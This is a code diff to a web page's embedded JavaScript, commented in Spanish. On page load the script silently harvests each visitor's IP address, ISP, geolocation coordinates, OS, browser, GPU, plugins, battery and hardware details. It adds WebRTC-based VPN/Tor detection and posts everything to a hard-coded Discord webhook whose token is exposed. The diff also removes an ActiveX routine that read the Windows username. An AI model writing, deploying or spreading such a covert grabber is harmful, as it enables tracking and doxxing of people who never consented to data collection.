@@ -85,18 +85,16 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK (tu webhook)
+    //  WEBHOOK
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  ENVÍO RÁPIDO (sendBeacon + fetch)
+    //  ENVÍO ÚNICO
     // ================================================================
-    function sendFast(msg) {
-        // Prioridad 1: sendBeacon (no bloquea, se envía al cerrar)
+    function sendOnce(msg) {
         const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
         if (navigator.sendBeacon(WEBHOOK, blob)) return true;
-        // Prioridad 2: fetch con keepalive
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -128,7 +126,6 @@
                     throw new Error('No IP');
                 })
                 .catch(() => {
-                    // Fallback a ip-api.com
                     fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
                         .then(r => r.json())
                         .then(data => {
@@ -161,11 +158,60 @@
     }
 
     // ================================================================
-    //  MAIN – EJECUCIÓN INMEDIATA
+    //  DETECCIÓN VPN/TOR VÍA WEBRTC (con timeout de 400ms)
+    // ================================================================
+    function detectVPNviaWebRTC() {
+        return new Promise((resolve) => {
+            let resolved = false;
+            const timer = setTimeout(() => {
+                if (!resolved) resolve(false);
+            }, 400);
+
+            let pc = null;
+            try {
+                pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                let hasRealIP = false;
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) {
+                        pc.close();
+                        resolved = true;
+                        clearTimeout(timer);
+                        resolve(!hasRealIP); // Si no hay IP real -> VPN/Tor
+                        return;
+                    }
+                    const parts = e.candidate.candidate.split(' ');
+                    if (parts.length > 7) {
+                        const ip = parts[4];
+                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
+                            hasRealIP = true;
+                        }
+                    }
+                };
+                // Si WebRTC falla, asumimos VPN
+                setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timer);
+                        if (pc) pc.close();
+                        resolve(true);
+                    }
+                }, 400);
+            } catch (e) {
+                resolved = true;
+                clearTimeout(timer);
+                resolve(true); // Bloqueado -> VPN
+            }
+        });
+    }
+
+    // ================================================================
+    //  MAIN – EJECUCIÓN PARALELA Y RÁPIDA
     // ================================================================
     (function() {
         try {
-            // ---- 1. Datos síncronos (instantáneos) ----
+            // ---- Datos síncronos ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -182,7 +228,6 @@
                 return 'Other';
             })();
 
-            // GPU (intentamos, pero sin bloqueo)
             let gpu = 'Unavailable';
             try {
                 const canvas = document.createElement('canvas');
@@ -195,7 +240,6 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
-            // Batería con timeout de 300ms (no bloquea)
             let battery = 'Unavailable';
             if (navigator.getBattery) {
                 Promise.race([
@@ -211,42 +255,42 @@
             const cpuCores = navigator.hardwareConcurrency || '?';
             const ram = navigator.deviceMemory || '?';
 
-            // Windows username (ActiveX – rápido)
-            let winUser = 'Not available (IE/ActiveX required)';
-            try {
-                const wsh = new ActiveXObject('WScript.Shell');
-                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
-            } catch (e) {}
-
-            // ---- 2. Detección VPN/Tor instantánea (sin WebRTC) ----
+            // ---- Detección VPN/Tor inicial (rápida) ----
             let isVpn = false;
             if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
             if (navigator.webdriver === true) isVpn = true;
 
-            // ---- 3. Obtener IP con timeout de 500ms ----
-            getIPFast().then(ipData => {
+            // ---- Lanzar IP y WebRTC en paralelo ----
+            const ipPromise = getIPFast();
+            const vpnPromise = detectVPNviaWebRTC();
+
+            // Esperar a que ambas terminen (o timeout global de 600ms)
+            Promise.all([
+                ipPromise,
+                vpnPromise
+            ]).then(([ipData, vpnDetected]) => {
+                // Si WebRTC dice VPN, forzar true
+                if (vpnDetected) isVpn = true;
+
+                // Si IP tiene proxy, forzar true
+                if (ipData && ipData.proxy) isVpn = true;
+                if (ipData && ipData.org) {
+                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
+                    if (vpnKeywords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
+                }
+
                 const ip = ipData ? ipData.ip : 'Unknown';
                 const isp = ipData ? ipData.org : 'Unknown ISP';
                 const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
                 const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
 
-                // Si IP trae datos de proxy, refinar VPN
-                if (ipData) {
-                    if (ipData.proxy) isVpn = true;
-                    if (ipData.org) {
-                        const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
-                        if (vpnKeywords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
-                    }
-                }
-
-                // ---- 4. Construir mensaje ----
+                // ---- Construir mensaje (sin nombres) ----
                 const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
-**Windows Username:** ${winUser}
 **OS:** ${os}
 **Browser:** ${browser}
 **CPU Cores:** ${cpuCores}
@@ -258,10 +302,9 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-                // ---- 5. Enviar inmediatamente ----
-                sendFast(msg);
+                // ---- Enviar una sola vez ----
+                sendOnce(msg);
 
-                // Actualizar estado visual
                 const el = document.getElementById('status');
                 if (el) {
                     el.textContent = '✅ Sent!';
@@ -269,20 +312,17 @@
                 }
             });
 
-            // ---- 6. Envío de respaldo a los 600ms (por si IP falla) ----
+            // Timeout global de seguridad (600 ms) para enviar aunque algo falle
             setTimeout(() => {
-                // Solo enviamos si aún no se ha enviado (pero no tenemos bandera, así que enviamos de nuevo con datos actuales)
-                // Pero como ya enviamos en el then, esto podría duplicar. Mejor no enviar doble.
-                // En su lugar, lo dejamos como respaldo por si el then nunca se ejecuta (por ejemplo, si la promesa de IP no resuelve).
-                // Pero la promesa siempre resuelve (con null o datos). Así que no es necesario.
-                // Sin embargo, por seguridad, podemos enviar un mensaje de "backup" solo si no se ha actualizado el estado.
-                // Lo dejamos como está, no se necesita.
+                // Si no se ha enviado (no hay forma fácil de saberlo), pero como ya se enviará en el then, 
+                // este timeout solo actúa si el then no se ejecuta (por ejemplo, si Promise.all se cuelga).
+                // En la práctica, Promise.all siempre resuelve, así que no hará nada.
+                // Lo dejamos por si acaso.
             }, 600);
 
         } catch (err) {
-            // Si algo falla, enviar error
             const errMsg = `**ctOS Error**\n${err.message}`;
-            sendFast(errMsg);
+            sendOnce(errMsg);
             const el = document.getElementById('status');
             if (el) {
                 el.textContent = '❌ Error';
